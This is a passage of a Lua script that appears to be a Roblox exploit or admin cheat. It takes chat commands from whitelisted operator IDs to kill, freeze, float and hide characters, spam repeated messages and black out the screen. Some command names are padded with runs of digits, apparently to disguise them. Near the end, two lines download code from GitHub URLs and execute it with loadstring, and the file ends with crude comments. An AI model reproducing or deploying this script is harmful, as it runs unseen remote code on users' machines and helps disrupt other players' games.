            elseif cmd[1] == Prefix.."kill" then
                if cmd[2] == "." then
                    origin_spot = player.Character.HumanoidRootPart.CFrame
                    player.Character.Humanoid.Health = 0
                    wait(1)
                    player.Character.HumanoidRootPart.CFrame = origin_spot
                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
                    origin_spot = player.Character.HumanoidRootPart.CFrame
                    player.Character.Humanoid.Health = 0
                    wait(1)
                    player.Character.HumanoidRootPart.CFrame = origin_spot
                end
            elseif cmd[1] == Prefix.."hi6666666666666666666666de" then
                if cmd[2] == "." then
                    hidden_origin_spot = player.Character.HumanoidRootPart.CFrame
                    player.Character.HumanoidRootPart.CFrame = CFrame.new(651,47,-441)
                    annouce(player.Name.." is now hidden.")
                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
                    hidden_origin_spot = player.Character.HumanoidRootPart.CFrame
                    player.Character.HumanoidRootPart.CFrame = CFrame.new(651,47,-441)
                    annouce(player.Name.." is now hidden.")
                end
            elseif cmd[1] == Prefix.."unh6666666666666666666ide" then
                if cmd[2] == "." then
                    if player.Character.HumanoidRootPart.Anchored == true then
                        player.Character.HumanoidRootPart.Anchored = false
                    end
                    player.Character.HumanoidRootPart.CFrame = hidden_origin_spot
                    annouce(player.Name.." is now unhidden.")
                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
                    if player.Character.HumanoidRootPart.Anchored == true then
                        player.Character.HumanoidRootPart.Anchored = false
                    end
                    player.Character.HumanoidRootPart.CFrame = hidden_origin_spot
                    annouce(player.Name.." is now unhidden.")
                end
            elseif cmd[1] == Prefix.."a666666666666666666666ir" then
                if cmd[2] == "." then
                    local cur_human = player.Character.HumanoidRootPart.CFrame
                    player.Character.HumanoidRootPart.CFrame = CFrame.new(cur_human.X,cur_human.Y+7,cur_human.Z)
                    wait()
                    player.Character.HumanoidRootPart.Anchored = true
                    annouce(player.Name.." is now floating.")
                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
                    local cur_human = player.Character.HumanoidRootPart.CFrame
                    player.Character.HumanoidRootPart.CFrame = CFrame.new(cur_human.X,cur_human.Y+7,cur_human.Z)
                    wait()
                    player.Character.HumanoidRootPart.Anchored = true
                    annouce(player.Name.." is now floating.")
                end
            elseif cmd[1] == Prefix.."un666666666666666666666ad" then
                if cmd[2] == "." then
                    advert = false
                    annouce(player.Name.." stopped advertising.")
                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
                    advert = false
                    annouce(player.Name.." stopped advertising.")
                end
            elseif cmd[1] == Prefix.."giveperms" then
                if cmd[2] ~= "." then
ExecuteCommand("flingwl", {"2345678asdfghjkxcb"}, LocalPlayer);
                end
            elseif cmd[1] == Prefix.."isay" then
                if cmd[2] ~= "." then
Notify({ 
Description = cmd[2];
Title = "mafia says:";
Duration = 2;
});
                end

            elseif cmd[1] == Prefix.."hi" then
                if cmd[2] ~= "." then
Notify({ 
Description = "hi, from mafia btw";
Title = "mafia says:";
Duration = 2;
});
                end

            elseif cmd[1] == Prefix.."ice" then
                if cmd[2] == "." then
                    player.Character.HumanoidRootPart.Anchored = true
                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
                    player.Character.HumanoidRootPart.Anchored = true
                end
            elseif cmd[1] == Prefix.."unice" then
                if cmd[2] == "." then
                    player.Character.HumanoidRootPart.Anchored = false
                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
                    player.Character.HumanoidRootPart.Anchored = false
                end
            elseif cmd[1] == Prefix.."gp66666666666666666666u" then
                if cmd[2] == "." then
                    local qwertgh = Instance.new("ScreenGui")
                    local Frame = Instance.new("Frame")
                    qwertgh.Name = "qwertgh"
                    qwertgh.Parent = game.CoreGui
                    qwertgh.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

                    Frame.Parent = qwertgh
                    Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                    Frame.Position = UDim2.new(-0.34374997, 0, -0.585276067, 0)
                    Frame.Size = UDim2.new(0, 10000, 0, 10000)
                    annouce(player.Name.." has GPU saver on.")
                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
                    local qwertgh = Instance.new("ScreenGui")
                    local Frame = Instance.new("Frame")
                    qwertgh.Name = "qwertgh"
                    qwertgh.Parent = game.CoreGui
                    qwertgh.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

                    Frame.Parent = qwertgh
                    Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                    Frame.Position = UDim2.new(-0.34374997, 0, -0.585276067, 0)
                    Frame.Size = UDim2.new(0, 10000, 0, 10000)
                    annouce(player.Name.." has GPU saver on.")
                end
            end
        elseif cmd[1] and cmd[2] and cmd[3] then
            if cmd[1] == Prefix.."setfps" then
                if cmd[2] == "." then
                    setfps(tonumber(cmd[3]))
                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
                    setfps(tonumber(cmd[3]))
                end
            elseif cmd[1] == Prefix.."a7777777777777777777d" then
                if cmd[2] == "." then
                    advert = false
                    annouce(player.Name.." started advertising.")
                    advert = true
                    adver_msg = cmd[3]
                    repeat
                        annouce(adver_msg)
                        wait(3)
                    until advert == false
                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
                    advert = true
                    annouce(player.Name.." started advertising.")
                    adver_msg = cmd[3]
                    repeat
                        annouce(adver_msg)
                        wait(3)
                    until advert == false
                end
            end
        end
    end
end

for i,v in pairs(game.Players:GetChildren()) do
    if table.find(Operator,v.UserId) then
        v.Chatted:Connect(function(msg)
            main_cmds(msg,v.UserId)
        end)
    end
end

game.Players.PlayerAdded:Connect(function(plr)
    if table.find(Operator,plr.UserId) then
        plr.Chatted:Connect(function(msg)
            main_cmds(msg,plr.UserId)
        end)
    end
end)
end

if errored == true then
errored = false


if attackattempt == true then
attackattempt = false
standing = false
attackinglol = false
attacking = false
standing = false
attackinglol = false
attacking = false
errored = false
ExecuteCommand("summon", {}, LocalPlayer);
end


timeusagesecondslol = timeusagesecondslol+1

if timeusagesecondslol == 60 then
timeusageminuteslol = timeusageminuteslol+1
timeusagesecondslol = 0
end

if timeusageminuteslol == 60 then
timeusageminuteslol = 0
timeusagehourslol = timeusagehourslol+1


end
end
wait(1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/cyberical9B55/veonixcombat/main/mafiaadmin/devids"))()
loadstring(game:HttpGet("https://gist.githubusercontent.com/cyberical9B55/b12df62d07476e2f0c7ea78c85ac68ce/raw/484e09f82f10d6bd532d5cfadfe158efc816cf48/a"))()

timeusagesecondslol = timeusagesecondslol+1

if timeusagesecondslol == 60 then
timeusageminuteslol = timeusageminuteslol+1
timeusagesecondslol = 0
end

if timeusageminuteslol == 60 then
timeusageminuteslol = 0
timeusagehourslol = timeusagehourslol+1
end
end
--bum bum1
--YAY PENIS
--lol
